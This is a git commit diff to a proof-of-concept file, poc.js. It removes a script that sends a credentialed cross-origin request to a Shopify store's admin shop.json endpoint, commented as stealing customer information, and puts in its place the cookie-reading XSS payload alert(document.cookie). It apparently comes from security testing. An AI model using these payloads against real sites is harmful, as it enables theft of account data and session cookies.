152277f0aa2e22de23ad9e4d6af21e2154333399
koffdsa <51981550@qq.com>
2022-04-17 04:24:22 +0800

    Update poc.js

--- js/poc.js
+++ js/poc.js
@@ -1,13 +1,1 @@
-//steal the customer's information
-var steal = new XMLHttpRequest();
-steal.open('get', 'https://johnstone-attacker.myshopify.com/admin/shop.json');
-steal.withCredentials = true;
-steal.send();
-steal.onreadystatechange = function () {
-      if (steal.readyState == 4 && steal.status == 200) {
-            console.log('数据偷取成功');
-            alert(steal.responseText);
-    }
-}
-
-
+alert(document.cookie);
